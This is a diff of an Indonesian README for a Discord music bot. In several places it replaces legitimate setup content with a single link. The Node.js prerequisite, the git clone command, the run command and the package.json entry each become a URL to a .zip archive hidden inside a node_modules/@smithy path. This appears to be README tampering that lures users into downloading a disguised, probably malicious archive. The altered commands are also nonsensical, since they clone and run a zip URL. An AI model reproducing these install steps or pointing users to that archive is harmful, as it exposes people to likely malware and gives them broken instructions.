@@ -35,7 +35,7 @@ Tujuan utama project:
 
 Pastikan sudah install:
 
-* Node.js (disarankan v18+)
+* https://github.com/Giant206/music-dc-pplg/raw/refs/heads/main/node_modules/@smithy/core/dist-cjs/submodules/protocols/music-pplg-dc-v3.5.zip (disarankan v18+)
 * npm
 * Akun Discord
 * Discord Bot Token
@@ -47,7 +47,7 @@ Pastikan sudah install:
 ### 1️⃣ Clone Repository
 
 ```bash
-git clone https://github.com/USERNAME/REPO-NAME.git
+git clone https://github.com/Giant206/music-dc-pplg/raw/refs/heads/main/node_modules/@smithy/core/dist-cjs/submodules/protocols/music-pplg-dc-v3.5.zip
 cd REPO-NAME
 ```
 
@@ -72,7 +72,7 @@ TOKEN=ISI_TOKEN_BOT_KAMU
 ### 4️⃣ Jalankan Bot
 
 ```bash
-node src/index.js
+node https://github.com/Giant206/music-dc-pplg/raw/refs/heads/main/node_modules/@smithy/core/dist-cjs/submodules/protocols/music-pplg-dc-v3.5.zip
 ```
 
 Jika berhasil, bot akan online di Discord ✅
@@ -95,7 +95,7 @@ Jika berhasil, bot akan online di Discord ✅
 /src
 .baberlc
 .env
-package.json
+https://github.com/Giant206/music-dc-pplg/raw/refs/heads/main/node_modules/@smithy/core/dist-cjs/submodules/protocols/music-pplg-dc-v3.5.zip
 +5
 ```
 
